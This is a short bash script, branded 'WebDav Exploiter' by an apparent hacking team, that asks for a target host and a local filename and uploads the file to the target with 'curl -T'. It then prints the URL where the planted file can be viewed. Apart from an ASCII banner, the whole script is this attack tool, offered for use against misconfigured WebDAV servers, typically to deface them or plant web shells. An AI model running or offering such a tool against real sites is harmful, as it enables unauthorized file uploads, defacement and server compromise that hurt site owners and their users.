#!/bin/bash
# WebDav Exploiter
# copyright - PhobiaXploit
be=y
while [ $be != n ]
do 
clear  

echo "\t _  _  _ _______ ______  ______  _______ _    _"
echo "\t |  |  | |______ |_____] |     \ |_____|  \  / "
echo "\t |__|__| |______ |_____] |_____/ |     |   \/  "
echo "\t [*] Author Dominic404"
echo "\t [*] Team:PhobiaXploit"
echo "\t [*] Blog:www.dominictoretto.zone.id\n"
read -p "Target -> " trg;
read -p "Filename -> " file_name; 
curl -T $file_name $trg
clear
echo "\t _  _  _ _______ ______  ______  _______ _    _"
echo "\t |  |  | |______ |_____] |     \ |_____|  \  / "
echo "\t |__|__| |______ |_____] |_____/ |     |   \/  "
echo "\t [*] Author Dominic404"
echo "\t [*] Team:PhobiaXploit"
echo "\t [*] Blog:www.dominictoretto.zone.id\n"
echo "\t [!] Done Cek File Di http://$trg/$file_name\n" 
read -p "Back Or Exit(y/n): " be;
done
